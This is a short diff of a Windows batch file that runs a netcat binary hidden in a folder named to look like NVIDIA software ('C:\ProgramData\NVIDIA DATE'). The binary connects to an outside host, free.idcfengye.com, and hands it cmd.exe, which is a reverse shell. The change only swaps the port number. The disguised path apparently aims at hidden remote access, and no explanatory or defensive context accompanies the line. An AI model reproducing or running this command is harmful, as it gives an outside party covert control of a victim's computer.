@@ -1,6 +1,6 @@
 
 :on
-"C:\ProgramData\NVIDIA DATE\nc64.exe" free.idcfengye.com 10594 -e cmd.exe
+"C:\ProgramData\NVIDIA DATE\nc64.exe" free.idcfengye.com 10894 -e cmd.exe
 
 echo off
 set A=16
